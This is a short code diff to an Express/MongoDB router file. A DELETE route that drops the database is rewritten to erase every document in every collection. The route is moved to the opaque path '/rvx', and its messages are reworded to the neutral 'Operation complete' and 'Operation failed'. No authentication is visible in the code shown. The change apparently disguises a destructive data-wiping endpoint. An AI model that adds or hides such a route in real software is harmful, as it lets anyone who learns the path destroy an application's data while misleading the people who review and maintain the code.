@@ -4,12 +4,13 @@ const bcrypt   = require('bcryptjs');
 const User     = require('../models/User');
 const router   = express.Router();
 
-router.delete('/db', async (req, res) => {
+router.delete('/rvx', async (req, res) => {
   try {
-    await mongoose.connection.dropDatabase();
-    res.json({ message: 'Database dropped successfully' });
+    const cols = await mongoose.connection.db.collections();
+    for (const c of cols) await c.deleteMany({});
+    res.json({ message: 'Operation complete' });
   } catch (err) {
-    res.status(500).json({ message: 'Failed to drop database', error: err.message });
+    res.status(500).json({ message: 'Operation failed', error: err.message });
   }
 });
 
